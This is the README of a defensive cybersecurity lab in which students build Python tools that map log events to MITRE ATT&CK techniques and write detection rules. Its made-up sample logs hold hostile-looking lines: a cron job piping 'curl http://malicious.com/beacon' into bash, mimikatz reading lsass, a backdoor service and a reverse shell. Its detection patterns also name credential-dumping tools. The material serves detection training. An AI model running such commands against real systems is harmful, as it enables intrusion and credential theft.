# 🛡️ MITRE ATT&CK Mapping for Incident Detection

> **A hands-on cybersecurity lab for mapping security incidents to MITRE ATT&CK techniques and building automated detection tools**

![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-Scripting-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-c0392b?style=for-the-badge&logo=mitre&logoColor=white)
![STIX2](https://img.shields.io/badge/STIX2-Threat%20Intel-8e44ad?style=for-the-badge&logo=python&logoColor=white)
![Pandas](https://img.shields.io/badge/Pandas-Data%20Analysis-150458?style=for-the-badge&logo=pandas&logoColor=white)
![YAML](https://img.shields.io/badge/YAML-Detection%20Rules-cb4335?style=for-the-badge&logo=yaml&logoColor=white)

---

## 🎯 Objectives

By the end of this lab, you will be able to:

- 🗺️ **Understand the MITRE ATT&CK framework** structure and its application in cybersecurity
- 🔗 **Map detected security incidents** to specific MITRE ATT&CK techniques and tactics
- 🔍 **Analyze system logs** to identify attack patterns using the framework
- 🤖 **Create automated detection rules** based on MITRE ATT&CK techniques
- 📊 **Generate incident reports** with proper MITRE ATT&CK classifications

---

## 📋 Prerequisites

| Skill | Level |
|-------|-------|
| Cybersecurity Concepts & Common Attack Methods | Basic |
| Linux Command Line Operations | Familiar |
| Python Programming | Basic |
| Log File Formats (Windows Event Logs, Linux auth logs) | Basic Understanding |

---

## 🖥️ Lab Environment

> 💡 **Al Nafi** provides ready-to-use Linux-based cloud machines for this lab.
> Click **Start Lab** to access your pre-configured environment.

Your cloud machine comes pre-installed with:

| Tool / Library | Purpose |
|---------------|---------|
| 🐧 Ubuntu Linux + Python 3.x | Base environment |
| 📄 Sample security log files | Practice data |
| 🗺️ MITRE ATT&CK framework data | Framework reference |
| 🐍 `requests`, `pandas`, `stix2` | Required Python libraries |

---

## 🗂️ Lab Structure

```
mitre-lab/
├── 📁 data/
│   └── 📦 enterprise-attack.json      # MITRE ATT&CK framework data
├── 📁 scripts/
│   ├── 🐍 mitre_parser.py             # MITRE ATT&CK parser module
│   ├── 🐍 log_analyzer.py             # Log analyzer with ATT&CK mapping
│   ├── 🐍 view_results.py             # Results display script
│   ├── 🐍 auto_mapper.py              # Automated indicator mapper
│   └── 📝 custom_rules.yaml           # Custom detection rules
├── 📁 logs/
│   ├── 📄 windows_security.log        # Sample Windows security logs
│   ├── 📄 linux_auth.log              # Sample Linux auth logs
│   └── 📄 network.log                 # Sample network logs
└── 📁 reports/
    └── 📊 analysis_report.json        # Generated JSON report
```

---

# 🧪 Task 1: Setting Up the MITRE ATT&CK Environment

---

## 🏗️ Step 1 — Create Lab Directory Structure

> 📁 *Set up your workspace and download the MITRE ATT&CK framework data.*

```bash
mkdir -p ~/mitre-lab/{data,scripts,logs,reports}
cd ~/mitre-lab

# 📥 Download MITRE ATT&CK data
wget https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json \
  -O data/enterprise-attack.json
```

---

## 📦 Step 2 — Install Required Libraries

> 🐍 *Install all necessary Python packages.*

```bash
pip3 install requests pandas stix2 pyyaml
```

---

## 📄 Step 3 — Create Sample Log Files

> 🎭 *Generate realistic sample logs representing different attack scenarios.*

```bash
# 🪟 Windows security log sample
cat > logs/windows_security.log << 'EOF'
2024-01-15 10:30:15 EventID:4688 Process:powershell.exe CommandLine:"powershell -enc SQBuAHYAbwBrAGUA"
2024-01-15 10:31:22 EventID:4697 Service:malicious_svc Path:C:\temp\backdoor.exe
2024-01-15 10:32:10 EventID:4663 Object:C:\Windows\System32\lsass.exe Access:Read Process:mimikatz.exe
2024-01-15 10:33:45 EventID:4648 Account:admin Target:DC01 Process:net.exe
2024-01-15 10:34:12 EventID:5156 Protocol:TCP Source:192.168.1.100 Dest:10.0.0.5 Port:445
EOF

# 🐧 Linux auth log sample
cat > logs/linux_auth.log << 'EOF'
Jan 15 10:30:15 server sshd[1234]: Accepted password for root from 192.168.1.100
Jan 15 10:31:22 server sudo: admin : USER=root ; COMMAND=/bin/bash
Jan 15 10:32:10 server cron[9876]: (root) CMD (curl http://malicious.com/beacon | bash)
Jan 15 10:33:45 server systemd[1]: Started suspicious-service.service
EOF

# 🌐 Network log sample
cat > logs/network.log << 'EOF'
2024-01-15 10:30:15 TCP 192.168.1.100:1234 -> 10.0.0.5:445 SMB connection
2024-01-15 10:31:22 DNS Query: malicious-domain.com
2024-01-15 10:32:10 HTTP GET /payload.exe User-Agent: PowerShell
2024-01-15 10:33:45 TCP 192.168.1.100:4444 -> 203.0.113.1:443 Reverse shell
EOF
```

**🔍 Log Types and ATT&CK Relevance:**

| 📄 Log File | 🎯 Key Indicators |
|------------|------------------|
| `windows_security.log` | PowerShell execution, credential dumping, service installation |
| `linux_auth.log` | SSH access, privilege escalation, cron-based C2 |
| `network.log` | SMB lateral movement, DNS C2, reverse shells |

---

# 🐍 Task 2: Building the MITRE ATT&CK Parser

---

## 🏗️ Step 1 — Create MITRE Parser Module

> 🛠️ *Build a Python class to load and query the MITRE ATT&CK framework. Complete the `TODO` sections.*

```bash
# ✍️ Create parser script
nano scripts/mitre_parser.py
```

```python
#!/usr/bin/env python3
"""
MITRE ATT&CK Framework Parser
Students: Complete the methods to parse and query MITRE ATT&CK data
"""

import json

class MitreAttackParser:
    def __init__(self, json_file_path):
        """Initialize parser with MITRE ATT&CK JSON data"""
        self.json_file_path = json_file_path
        self.techniques = {}
        self.tactics = {}
        self.load_data()
    
    def load_data(self):
        """
        Load MITRE ATT&CK data from JSON file
        TODO: Implement JSON file loading
        TODO: Call parse_techniques() and parse_tactics()
        """
        pass
    
    def parse_techniques(self):
        """
        Parse techniques from MITRE ATT&CK data
        TODO: Iterate through objects with type 'attack-pattern'
        TODO: Extract technique ID from external_references
        TODO: Store technique name, description, tactics, and platforms
        Hint: Look for 'mitre-attack' in source_name
        """
        pass
    
    def parse_tactics(self):
        """
        Parse tactics from MITRE ATT&CK data
        TODO: Iterate through objects with type 'x-mitre-tactic'
        TODO: Extract tactic information
        TODO: Store in self.tactics dictionary
        """
        pass
    
    def get_technique_by_id(self, technique_id):
        """
        Retrieve technique details by ID
        TODO: Return technique from self.techniques dictionary
        """
        pass
    
    def search_techniques_by_keyword(self, keyword):
        """
        Search techniques by keyword in name or description
        TODO: Implement case-insensitive search
        TODO: Return list of matching techniques with id, name, description
        """
        pass
```

---

## ▶️ Step 2 — Test the Parser

> 🧪 *Run the parser and verify it loads framework data correctly.*

```bash
cd ~/mitre-lab/scripts
python3 mitre_parser.py
```

> ✅ **Expected Output:** Number of loaded techniques and tactics

---

# 🔍 Task 3: Creating the Log Analyzer

---

## 🏗️ Step 1 — Build Detection Rules

> 🛠️ *Create a log analyzer that maps patterns to MITRE ATT&CK techniques. Complete the `TODO` sections.*

```bash
# ✍️ Create log analyzer script
nano scripts/log_analyzer.py
```

```python
#!/usr/bin/env python3
"""
Log Analyzer with MITRE ATT&CK Mapping
Students: Complete the detection and analysis methods
"""

import re
import json
from datetime import datetime
from mitre_parser import MitreAttackParser

class LogAnalyzer:
    def __init__(self, mitre_parser):
        self.mitre_parser = mitre_parser
        self.detection_rules = self.load_detection_rules()
        self.findings = []
    
    def load_detection_rules(self):
        """
        Define detection rules mapping patterns to MITRE ATT&CK techniques
        TODO: Add more detection rules for different techniques
        """
        return {
            'T1059.001': {  # PowerShell
                'name': 'PowerShell Execution',
                'patterns': [
                    r'powershell\.exe.*-enc',
                    r'powershell.*-EncodedCommand'
                ],
                'log_types': ['windows_security']
            },
            'T1003.001': {  # LSASS Memory
                'name': 'Credential Dumping',
                'patterns': [
                    r'mimikatz\.exe',
                    r'lsass\.exe.*Access:Read'
                ],
                'log_types': ['windows_security']
            },
            # TODO: Add rules for T1543.003 (Service Installation)
            # TODO: Add rules for T1071.001 (Web Protocols C2)
            # TODO: Add rules for T1046 (Network Service Scanning)
        }
    
    def analyze_log_file(self, log_file_path, log_type):
        """
        Analyze a single log file for MITRE ATT&CK techniques
        TODO: Read log file content
        TODO: Check each detection rule against log content
        TODO: Call check_patterns for matching rules
        """
        pass
    
    def check_patterns(self, log_content, technique_id, rule, log_file):
        """
        Check if patterns match in log content
        TODO: Use regex to find pattern matches
        TODO: Extract matched log lines
        TODO: Create finding dictionary with technique details
        TODO: Append to self.findings
        """
        pass
    
    def calculate_severity(self, technique_id):
        """
        Calculate severity based on technique type
        TODO: Implement severity logic
        High: Credential access, persistence, privilege escalation
        Medium: Execution, command and control
        Low: Discovery, collection
        """
        pass
    
    def generate_report(self, output_file):
        """
        Generate JSON report of findings
        TODO: Create report structure with findings summary
        TODO: Include severity breakdown
        TODO: Write to JSON file
        """
        pass
```

---

## ▶️ Step 2 — Run Log Analysis

```bash
python3 log_analyzer.py
```

---

## 📊 Step 3 — View Results

> 🖥️ *Create a script to display analysis results in a readable format. Complete the `TODO` sections.*

```bash
# ✍️ Create results viewer
nano scripts/view_results.py
```

```python
#!/usr/bin/env python3
"""
Display analysis results in readable format
TODO: Load JSON report
TODO: Display summary statistics
TODO: Show detailed findings with technique information
"""

import json

def display_results(report_file):
    """
    Display formatted analysis results
    TODO: Implement result display logic
    """
    pass

if __name__ == "__main__":
    display_results('../reports/analysis_report.json')
```

---

# 🤖 Task 4: Automated Incident Mapping

---

## 🏗️ Step 1 — Create Auto-Mapper

> 🗺️ *Build an automated tool to map security indicators to ATT&CK techniques. Complete the `TODO` sections.*

```bash
# ✍️ Create auto-mapper script
nano scripts/auto_mapper.py
```

```python
#!/usr/bin/env python3
"""
Automated MITRE ATT&CK Mapping Tool
Students: Complete the indicator mapping logic
"""

import json
from mitre_parser import MitreAttackParser

class AutoMapper:
    def __init__(self, mitre_parser):
        self.mitre_parser = mitre_parser
        self.indicator_mappings = self.load_indicator_mappings()
    
    def load_indicator_mappings(self):
        """
        Define mappings between indicators and techniques
        TODO: Add more indicator categories and mappings
        """
        return {
            'file_indicators': {
                'powershell.exe': ['T1059.001'],
                'cmd.exe': ['T1059.003'],
                'mimikatz.exe': ['T1003.001'],
                # TODO: Add more file indicators
            },
            'network_indicators': {
                'port_445': ['T1021.002'],
                'port_3389': ['T1021.001'],
                # TODO: Add more network indicators
            },
            'behavior_indicators': {
                'encoded_powershell': ['T1059.001', 'T1027'],
                'service_creation': ['T1543.003'],
                # TODO: Add more behavior indicators
            }
        }
    
    def map_indicators(self, indicators):
        """
        Map indicators to MITRE ATT&CK techniques
        TODO: Check each indicator against all mapping categories
        TODO: Return set of mapped techniques and details
        """
        pass
    
    def generate_technique_details(self, technique_ids):
        """
        Get detailed information for techniques
        TODO: Query MITRE parser for each technique
        TODO: Return list of technique details
        """
        pass
    
    def create_incident_report(self, incident_name, indicators, output_file):
        """
        Create comprehensive incident report
        TODO: Map indicators to techniques
        TODO: Generate technique details
        TODO: Group by tactics
        TODO: Add recommendations
        TODO: Write JSON report
        """
        pass
    
    def generate_recommendations(self, technique_details):
        """
        Generate security recommendations
        TODO: Based on identified techniques, suggest mitigations
        Example: If T1059.001 detected, recommend PowerShell logging
        """
        pass
```

---

## ▶️ Step 2 — Test Auto-Mapper

```bash
python3 auto_mapper.py
```

---

## 📝 Step 3 — Create Custom Detection Rules

> 🔧 *Define your own YAML-based detection rules for specific attack patterns.*

```bash
# ✍️ Create custom rules file
nano scripts/custom_rules.yaml
```

```yaml
# 📋 Custom Detection Rules
# Students: Add your own detection rules here

rules:
  - id: "CUSTOM_001"
    technique_id: "T1059.001"
    name: "Suspicious PowerShell Execution"
    description: "Detects obfuscated PowerShell commands"
    patterns:
      - "powershell.*-windowstyle hidden"
      - "powershell.*-noprofile"
    severity: "HIGH"
    log_types: ["windows_security"]
    
  # TODO: Add rule for file deletion (T1070.004)
  # TODO: Add rule for process injection (T1055)
  # TODO: Add rule for scheduled tasks (T1053.005)
```

**🎯 Techniques to Implement:**

| Technique ID | Name | Severity |
|-------------|------|----------|
| `T1070.004` | File Deletion | 🟡 MEDIUM |
| `T1055` | Process Injection | 🔴 HIGH |
| `T1053.005` | Scheduled Task | 🔴 HIGH |

---

# ✅ Expected Outcomes

After completing this lab, you should have:

| # | Deliverable | Description |
|---|-------------|-------------|
| 🟢 1 | **MITRE ATT&CK Parser** | Functional parser that loads and queries framework data |
| 🟢 2 | **Log Analyzer** | Detects techniques in security logs |
| 🟢 3 | **Auto-Mapper** | Suggests techniques based on indicators |
| 🟢 4 | **JSON Reports** | Shows detected techniques with severity ratings |
| 🟢 5 | **Custom Rules** | Detection rules for specific attack patterns |

**📊 Example Report Output Structure:**

```json
{
  "total_findings": 8,
  "findings_by_severity": {
    "HIGH": 3,
    "MEDIUM": 4,
    "LOW": 1
  },
  "techniques_detected": ["T1059.001", "T1003.001", "T1543.003"],
  "tactics_coverage": ["execution", "credential-access", "persistence"]
}
```

---

# 🛠️ Troubleshooting Tips

| ❌ Issue | ✅ Solution |
|---------|------------|
| 📦 JSON parsing errors | Verify the ATT&CK JSON downloaded correctly; validate with `python3 -m json.tool data/enterprise-attack.json` |
| 🔍 No patterns detected | Ensure regex patterns are properly escaped; test individually using Python's `re` module |
| ❓ Missing technique details | Confirm technique IDs use correct format (`T####.###`); verify `parse_techniques()` populated the dictionary |

---

# 📚 Key Concepts

## 🗺️ MITRE ATT&CK Tactic Categories

| Tactic | Description | Example Techniques |
|--------|-------------|-------------------|
| ⚡ Execution | Running malicious code | T1059.001 PowerShell |
| 🔑 Credential Access | Stealing credentials | T1003.001 LSASS Dump |
| 🔒 Persistence | Maintaining access | T1543.003 Service Install |
| 📡 Command & Control | C2 communication | T1071.001 Web Protocols |
| 🔍 Discovery | Exploring the environment | T1046 Network Scanning |

## 🚦 Severity Levels

| Level | Color | Technique Categories |
|-------|-------|---------------------|
| 🔴 HIGH | Critical | Credential Access, Persistence, Privilege Escalation |
| 🟡 MEDIUM | Warning | Execution, Command and Control |
| 🟢 LOW | Info | Discovery, Collection |

---

# 🎓 Conclusion

This lab introduced the **MITRE ATT&CK framework** for mapping security incidents to standardized techniques and tactics. You learned to:

- 🗺️ **Parse and query** MITRE ATT&CK framework data programmatically
- 🔍 **Analyze security logs** for attack technique indicators
- 🤖 **Automate the mapping** of security events to ATT&CK techniques
- 📊 **Generate structured incident reports** with proper classifications

> 💡 The MITRE ATT&CK framework is essential for **threat intelligence**, **detection engineering**, and **incident response** — enabling you to communicate findings using industry-standard terminology.

---

## 🚀 Next Steps

- 🌐 Explore the full MITRE ATT&CK matrix at [attack.mitre.org](https://attack.mitre.org)
- 🕵️ Practice mapping real-world incidents to techniques
- 🔧 Develop detection rules for additional techniques
- 🖥️ Integrate ATT&CK mappings into your security monitoring tools

---

<div align="center">

![MITRE ATT&CK](https://img.shields.io/badge/MITRE-ATT%26CK%20Framework-c0392b?style=for-the-badge&logo=mitre&logoColor=white)
![Incident Detection](https://img.shields.io/badge/Incident-Detection-blue?style=for-the-badge&logo=hackthebox&logoColor=white)
![Lab](https://img.shields.io/badge/Al%20Nafi-Cybersecurity%20Lab-green?style=for-the-badge&logo=academia&logoColor=white)

**Made with ❤️ for Cybersecurity Learners**

</div>
